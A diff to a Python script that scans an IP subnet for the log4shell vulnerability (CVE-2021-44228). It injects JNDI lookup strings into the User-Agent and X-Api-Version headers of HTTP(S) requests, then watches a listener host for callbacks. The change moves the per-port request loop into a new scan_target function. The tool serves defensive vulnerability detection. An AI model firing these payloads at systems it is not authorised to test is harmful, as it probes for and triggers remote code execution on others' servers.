@@ -12,7 +12,7 @@ import logging
 import requests
 import requests.packages.urllib3
 
-VERSION="0.1"
+VERSION="0.2.2"
 DEFAULT_TARGET_PORTS="80,8080,443,8443"
 DEFAULT_LOG="./log4j-quick-scan.log"
 
@@ -35,17 +35,17 @@ def parse_arguments(argv=None):
 
 def info(listen_host):
     """ Print explanation """
-    print("Script is for quick scan of given IP subnet. It tries to establish HTTP(S) connection to given ports and provoke CVE-2021-44228 (log4shell) vulnerability.")
+    print("Script for quick scan for log4shell vulnerability.")
+    print("Read details on: https://github.com/metodidavidovic/log4j-quick-scan")
     print("---")
     print("How to use:")
-    print("   1. On listen host (any Linux machine reachable from targets), start tcpdump to catch traffic for any free TCP port.")
-    print("      e.g: tcpdump -nn -i ens160 tcp port 12345")
-    print("   2. Start this script on Linux machine that is allowed to communicate with target IP network.")
-    print("      e.g: ./log4j-quick-scan.py -e 192.168.0.3:12345 192.168.0.0/24")
-    print("   3. Script will send HTTP(S) request to every port in port list for every IP address (target) in given IP network.")
-    print("      HTTP headers User-Agent, X-Api-Version and X-Forwarded-For are filled with jndi string that will trigger vulnerable log4 library.")
-    print("   4. Monitor tcpdump output on listen host. Targets that are suspects for log4shell will try to do JNDI ldap remote lookup to listenhost.")
-    print("      Investigate those further, check software's vendor notices etc.")
+    print("   1. On listen host (any Linux machine reachable from targets),")
+    print("      start tcpdump to catch traffic for some free TCP port. Example:")
+    print("          tcpdump -nn -i ens160 tcp port 12345 or udp port 12345")
+    print("   2. Start this script on Linux machine that is allowed to communicate with targets.")
+    print("           ./log4j-quick-scan.py -e 192.168.0.3:12345 192.168.0.0/24")
+    print("   3. Monitor tcpdump output on listen host. Targets that are suspects for log4shell")
+    print("      will try to do JNDI ldap remote lookup to listenhost.")
     print("---")
 
 def create_jndi_string(listen_host):
@@ -87,6 +87,53 @@ def write_log_record(record,level="i"):
         logging.info(record)
     return True
 
+
+def scan_target(target_host,target_ports,jndi):
+    """ Send http(s) requests with some 'evil'  fields """
+    response4log=""
+    
+    # loop through specified port list
+    for port in target_ports:
+        # determine is it https or plain http
+        
+        if port.endswith("443") or port == "4430":
+            protocol="https"
+        else:
+            protocol="http"
+
+        # concatenate target url
+        url=protocol + "://" + str(target_host) + ":" + str(port)
+        
+        # do http request
+        try:
+            # disable all warnings
+            requests.packages.urllib3.disable_warnings()
+            # do request
+            response=""
+            # User-Agent is commonf for logging in web servers, X-Api-Version is for REST API version
+            response = requests.get(url, headers={'User-Agent': jndi, 'X-Api-Version': jndi, 'X-Forwarded-For': str(target_host)}, timeout=1, verify=False)
+            
+            # get status
+            response.raise_for_status()
+        except KeyboardInterrupt:  # catch SIGINT (ctrl + c)
+            print("[!] interruption received, stopping....")
+            sys.exit(1)
+        except requests.exceptions.HTTPError: 
+            answer=" [" + port + ":" + str(response.status_code) + "] "
+        except requests.exceptions.ConnectionError:
+            answer=" "
+        except: # pylint: disable=bare-except
+            answer=" "
+        else:
+            answer=" [" + port + ":" + str(response.status_code) + "] "
+            
+        response4log=response4log + answer 
+        print(answer, end='')
+        
+    return response4log
+    # end of port loop
+            
+            
 #########################
 
 
@@ -132,6 +179,7 @@ def main():
             
     # loop for every IP
     for target_ip in ipaddress.IPv4Network(target_ip_cidr,strict=False):
+        ports2log=""
         try:
             # get hostname from ip (for display only)
             target_hostname=socket.gethostbyaddr(str(target_ip))[0]
@@ -144,39 +192,8 @@ def main():
         logentry=str(target_ip) + " :: " + str(target_hostname) + " :: "
         print("     - " + logentry, end='')
 
-        ports2log=""
-        # loop through port list
-        for port in target_ports_array:
-            # determine is it https or plain http
-            if port == "443" or port == "8443":
-                protocol="https"
-            else:
-                protocol="http"
-
-            # concatenate target url
-            url=protocol + "://" + str(target_ip) + ":" + str(port)
-
-            # do http request
-            try:
-                # disable all warnings
-                requests.packages.urllib3.disable_warnings()
-                # do request
-                # User-Agent is commonf for logging in web servers, X-Api-Version is for REST API version
-                response = requests.get(url, headers={'User-Agent': jndi_string, 'X-Api-Version': jndi_string, 'X-Forwarded-For': str(target_ip)}, timeout=1, verify=False)
-                
-                # get status
-                response.raise_for_status()
-            except KeyboardInterrupt:  # catch SIGINT (ctrl + c)
-                print("[!] interruption received, stopping....")
-                sys.exit(1)
-            except: # pylint: disable=bare-except
-                answer=" "
-            else:
-                answer=" [" + port + ":" + str(response.status_code) + "] "
-                
-            ports2log=ports2log + answer 
-            print(answer, end='')
-            # end of port loop
+        # scan target for every port
+        ports2log=scan_target(target_ip,target_ports_array,jndi_string)
 
         # write to log: ip :: hostname :: live ports and status codes
         logentry=logentry + ports2log
